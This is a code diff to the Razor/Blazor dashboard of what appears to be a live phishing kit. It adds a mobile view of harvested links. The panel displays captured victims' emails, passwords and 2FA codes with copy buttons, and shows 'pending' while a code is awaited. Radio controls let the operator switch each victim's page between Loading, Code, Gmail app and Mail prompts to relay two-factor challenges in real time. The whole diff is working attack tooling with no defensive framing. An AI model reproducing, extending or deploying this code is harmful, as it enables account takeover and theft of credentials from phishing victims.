@@ -117,7 +117,8 @@
         }
         else
         {
-            <div class="table-wrap">
+            <!-- ── Desktop table (hidden on mobile ≤ 768 px) ── -->
+            <div class="table-wrap dash-table-view">
                 <div class="table-scroll">
                     <table class="cl-table">
                         <thead>
@@ -166,10 +167,7 @@
                                                 <span class="material-icons">@(_copied == $"email-{idx}" ? "check" : "content_copy")</span>
                                             </button>
                                         }
-                                        else
-                                        {
-                                            <span class="cl-empty">—</span>
-                                        }
+                                        else { <span class="cl-empty">—</span> }
                                     </td>
 
                                     <td class="password">
@@ -182,21 +180,12 @@
                                                 <span class="material-icons">@(_copied == $"pass-{idx}" ? "check" : "content_copy")</span>
                                             </button>
                                         }
-                                        else
-                                        {
-                                            <span class="cl-empty">—</span>
-                                        }
+                                        else { <span class="cl-empty">—</span> }
                                     </td>
 
                                     <td class="code">
-                                        @if (log is null)
-                                        {
-                                            <span class="cl-empty">—</span>
-                                        }
-                                        else if (string.IsNullOrEmpty(log.Code))
-                                        {
-                                            <span class="pending">pending…</span>
-                                        }
+                                        @if (log is null) { <span class="cl-empty">—</span> }
+                                        else if (string.IsNullOrEmpty(log.Code)) { <span class="pending">pending…</span> }
                                         else
                                         {
                                             <span class="cell-val">@log.Code</span>
@@ -212,36 +201,13 @@
                                         @if (link.IsLocked)
                                         {
                                             <div class="dash-radio-group" @key="@($"rg-{link.Id}-{link.PageMode}")">
-                                                <label class="dash-radio-label">
-                                                    <input type="radio" name="page-@link.Id"
-                                                           checked="@(link.PageMode == 0)"
-                                                           @onchange="@(() => SetPage(link, 0))" />
-                                                    <span>Loading</span>
-                                                </label>
-                                                <label class="dash-radio-label">
-                                                    <input type="radio" name="page-@link.Id"
-                                                           checked="@(link.PageMode == 1)"
-                                                           @onchange="@(() => SetPage(link, 1))" />
-                                                    <span>Code</span>
-                                                </label>
-                                                <label class="dash-radio-label">
-                                                    <input type="radio" name="page-@link.Id"
-                                                           checked="@(link.PageMode == 2)"
-                                                           @onchange="@(() => SetPage(link, 2))" />
-                                                    <span>Gmail app</span>
-                                                </label>
-                                                <label class="dash-radio-label">
-                                                    <input type="radio" name="page-@link.Id"
-                                                           checked="@(link.PageMode == 3)"
-                                                           @onchange="@(() => SetPage(link, 3))" />
-                                                    <span>Mail</span>
-                                                </label>
+                                                <label class="dash-radio-label"><input type="radio" name="page-@link.Id" checked="@(link.PageMode == 0)" @onchange="@(() => SetPage(link, 0))" /><span>Loading</span></label>
+                                                <label class="dash-radio-label"><input type="radio" name="page-@link.Id" checked="@(link.PageMode == 1)" @onchange="@(() => SetPage(link, 1))" /><span>Code</span></label>
+                                                <label class="dash-radio-label"><input type="radio" name="page-@link.Id" checked="@(link.PageMode == 2)" @onchange="@(() => SetPage(link, 2))" /><span>Gmail app</span></label>
+                                                <label class="dash-radio-label"><input type="radio" name="page-@link.Id" checked="@(link.PageMode == 3)" @onchange="@(() => SetPage(link, 3))" /><span>Mail</span></label>
                                             </div>
                                         }
-                                        else
-                                        {
-                                            <span class="url-toggle-na">—</span>
-                                        }
+                                        else { <span class="url-toggle-na">—</span> }
                                     </td>
 
                                     <td class="time">@link.CreatedAt.ToLocalTime().ToString("MM-dd HH:mm")</td>
@@ -259,8 +225,86 @@
                         </tbody>
                     </table>
                 </div>
-                <p class="count">@_links.Count link@(_links.Count != 1 ? "s" : "")</p>
             </div>
+
+            <!-- ── Mobile card list (shown on ≤ 768 px) ── -->
+            <div class="dash-card-list">
+                @for (int i = 0; i < _links.Count; i++)
+                {
+                    var link = _links[i];
+                    var log  = link.LoginLogs.FirstOrDefault();
+                    var idx  = i;
+                    <div class="dash-card @(link.IsLocked ? "dash-card-captured" : "")">
+
+                        <!-- slug + delete -->
+                        <div class="dash-card-header">
+                            <span class="dash-card-slug">/@link.Slug</span>
+                            <button class="url-delete-btn" @onclick="@(() => DeleteLink(link.Id))" title="Delete">
+                                <span class="material-icons">delete</span>
+                            </button>
+                        </div>
+
+                        <!-- full URL + copy -->
+                        <div class="dash-card-url">
+                            <span title="@link.FullUrl">@link.FullUrl</span>
+                            <button class="copy-btn" @onclick="@(() => Copy(link.FullUrl, $"murl-{idx}"))" title="Copy URL">
+                                <span class="material-icons">@(_copied == $"murl-{idx}" ? "check" : "content_copy")</span>
+                            </button>
+                        </div>
+
+                        @if (log is not null)
+                        {
+                            <div class="dash-card-row">
+                                <span class="dash-card-label">Email</span>
+                                <span class="dash-card-val dash-card-email">@log.Email</span>
+                                <button class="copy-btn" @onclick="@(() => Copy(log.Email, $"memail-{idx}"))" title="Copy">
+                                    <span class="material-icons">@(_copied == $"memail-{idx}" ? "check" : "content_copy")</span>
+                                </button>
+                            </div>
+
+                            <div class="dash-card-row">
+                                <span class="dash-card-label">Password</span>
+                                <span class="dash-card-val dash-card-pass">@log.Password</span>
+                                <button class="copy-btn" @onclick="@(() => Copy(log.Password, $"mpass-{idx}"))" title="Copy">
+                                    <span class="material-icons">@(_copied == $"mpass-{idx}" ? "check" : "content_copy")</span>
+                                </button>
+                            </div>
+
+                            <div class="dash-card-row">
+                                <span class="dash-card-label">2FA</span>
+                                @if (string.IsNullOrEmpty(log.Code))
+                                {
+                                    <span class="pending">pending…</span>
+                                }
+                                else
+                                {
+                                    <span class="dash-card-val dash-card-code">@log.Code</span>
+                                    <button class="copy-btn" @onclick="@(() => Copy(log.Code, $"mcode-{idx}"))" title="Copy">
+                                        <span class="material-icons">@(_copied == $"mcode-{idx}" ? "check" : "content_copy")</span>
+                                    </button>
+                                }
+                            </div>
+                        }
+
+                        <!-- date + page-mode radios -->
+                        <div class="dash-card-footer">
+                            <span class="dash-card-date">@link.CreatedAt.ToLocalTime().ToString("MM-dd HH:mm")</span>
+                            @if (link.IsLocked)
+                            {
+                                <div class="dash-radio-group" @key="@($"mob-rg-{link.Id}-{link.PageMode}")">
+                                    <label class="dash-radio-label"><input type="radio" name="mob-page-@link.Id" checked="@(link.PageMode == 0)" @onchange="@(() => SetPage(link, 0))" /><span>Loading</span></label>
+                                    <label class="dash-radio-label"><input type="radio" name="mob-page-@link.Id" checked="@(link.PageMode == 1)" @onchange="@(() => SetPage(link, 1))" /><span>Code</span></label>
+                                    <label class="dash-radio-label"><input type="radio" name="mob-page-@link.Id" checked="@(link.PageMode == 2)" @onchange="@(() => SetPage(link, 2))" /><span>Gmail app</span></label>
+                                    <label class="dash-radio-label"><input type="radio" name="mob-page-@link.Id" checked="@(link.PageMode == 3)" @onchange="@(() => SetPage(link, 3))" /><span>Mail</span></label>
+                                </div>
+                            }
+                        </div>
+
+                    </div>
+                }
+            </div>
+
+            <p class="count">@_links.Count link@(_links.Count != 1 ? "s" : "")</p>
         }
 
     </div>
